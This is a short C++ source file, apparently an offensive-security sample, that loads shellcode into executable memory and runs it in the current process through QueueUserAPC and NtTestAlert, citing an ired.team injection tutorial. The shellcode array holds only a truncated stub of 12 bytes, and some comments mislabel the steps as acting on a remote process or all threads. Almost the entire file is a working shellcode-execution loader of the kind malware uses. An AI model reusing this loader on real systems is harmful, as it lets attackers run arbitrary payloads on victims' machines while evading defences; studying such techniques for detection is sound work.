// APC objects to current thread via NtTestAlert native API
// https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <vector>

unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	//0x41, 0x50, ...
};

unsigned int len = sizeof(shellcode);

#pragma comment(lib, "ntdll")
using ntapiFun = NTSTATUS(NTAPI*)();

int main(int argc, char* argv[]) {
	PVOID buffer;
	std::vector<DWORD> thread_Ids;
	HANDLE thread_handle;

	// find NtTestAlert
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	ntapiFun testAlert = (ntapiFun)(GetProcAddress(hNTDLL, "NtTestAlert"));

	// allocate memory buffer for remote process
	buffer = VirtualAlloc(NULL, len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (buffer == NULL) return 0;
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)buffer);

	// APC routine
	PTHREAD_START_ROUTINE apc_routine = (PTHREAD_START_ROUTINE)buffer;

	// write code in another process memory
	if (!WriteProcessMemory(GetCurrentProcess(), buffer, shellcode, len, NULL)) return 0;

	// loop through all threads and queue APC
	printf("%-15s : %lu\n", "ThreadId", GetCurrentThreadId());
	QueueUserAPC((PAPCFUNC)apc_routine, GetCurrentThread(), NULL);
    testAlert();
}